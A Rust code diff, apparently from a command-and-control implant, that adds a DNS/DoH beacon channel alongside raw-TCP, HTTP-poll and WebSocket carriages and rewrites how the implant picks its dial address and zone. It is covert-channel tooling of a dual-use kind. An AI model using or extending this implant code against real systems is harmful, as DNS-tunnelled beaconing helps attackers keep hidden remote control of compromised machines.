@@ -1,3 +1,4 @@
+pub mod dns;
 pub mod http;
 pub mod rawtcp;
 pub mod stream;
@@ -105,33 +106,79 @@ pub fn accept_tasking(session: &mut Session, inbound: &[crate::wire::Frame], ack
 /// dial carries no route at all -- the raw address the carriage connects
 /// to, normalized to its bare authority.
 pub fn dialed_beacon_url(profile: &Profile) -> String {
+    // The DNS family's dial data is the zone itself, and the bake strips
+    // paths off its derived beaconURL -- the very place the zone lives. So
+    // the DNS dial picks whichever front CARRIES a zone (the split-socket
+    // bake would name a zoned beacon front; the single-front bake carries
+    // it on the enroll front), before the web families' route derivation
+    // touches any path at all.
+    let dns_fronts = [
+        profile.beacon_url.trim_end_matches('/'),
+        profile.enroll_url.trim_end_matches('/'),
+    ];
+    for front in dns_fronts {
+        if let Some((_, _, zone)) = dns::parse_front(front) {
+            if !zone.is_empty() {
+                return front.to_string();
+            }
+        }
+    }
     if profile.beacon_url.is_empty() {
-        return normalize_socket_front(beacon_url(&profile.enroll_url));
+        return normalize_fronts(beacon_url(&profile.enroll_url));
     }
     let baked = profile.beacon_url.trim_end_matches('/');
-    normalize_socket_front(if baked.contains("/implants/") {
+    normalize_fronts(if baked.contains("/implants/") {
         baked.to_string()
     } else {
         format!("{baked}/implants/beacon")
     })
 }
 
-/// The socket family's front shape: tcp:// plus the bare authority, any
-/// envelope-derived path dropped (the dial is the address, not a route).
-fn normalize_socket_front(front: String) -> String {
-    let Some(rest) = front.strip_prefix("tcp://") else {
-        return front;
-    };
-    let authority = rest.split('/').next().unwrap_or(rest);
-    format!("tcp://{authority}")
+/// The non-web families' front shapes: the socket's dial is the bare
+/// tcp://authority (no route), and the DNS family's is resolver plus zone
+/// (the envelope-derived path dropped for the first path segment -- the
+/// zone is the dial's own data, not a route).
+fn normalize_fronts(front: String) -> String {
+    if let Some(rest) = front.strip_prefix("tcp://") {
+        let authority = rest.split('/').next().unwrap_or(rest);
+        return format!("tcp://{authority}");
+    }
+    for scheme in ["dns", "doh"] {
+        let prefix = format!("{scheme}://");
+        if let Some(rest) = front.strip_prefix(&prefix) {
+            let authority = rest.split('/').next().unwrap_or(rest);
+            let zone = rest[authority.len().min(rest.len())..]
+                .trim_start_matches('/')
+                .split('/')
+                .next()
+                .unwrap_or("")
+                .trim_end_matches('.');
+            return if zone.is_empty() {
+                format!("{scheme}://{authority}")
+            } else {
+                format!("{scheme}://{authority}/{zone}")
+            };
+        }
+    }
+    front
 }
 
 /// The carriage the bake's front and mode name: the socket family's dial
 /// picks the raw-TCP client (the mode choosing its poll or live shape),
 /// otherwise poll is the default and stream the WebSocket client.
 pub fn carriage_for(profile: &Profile) -> Box<dyn Contact> {
-    if dialed_beacon_url(profile).starts_with("tcp://") {
+    let dial = dialed_beacon_url(profile);
+    if dial.starts_with("tcp://") {
         return Box::new(rawtcp::RawTcp::new(profile));
+    }
+    if dial.starts_with("dns://") || dial.starts_with("doh://") {
+        return match dns::Dns::new(profile) {
+            Ok(carriage) => Box::new(carriage),
+            // The dial is DNS-shaped by construction here, so this is a
+            // bind failure: the run loop's walk treats it as a dropped
+            // cycle and retries on the cadence.
+            Err(_) => Box::new(http::Poll::new(profile)),
+        };
     }
     match profile.mode.as_str() {
         "stream" => Box::new(stream::Stream::new(profile)),
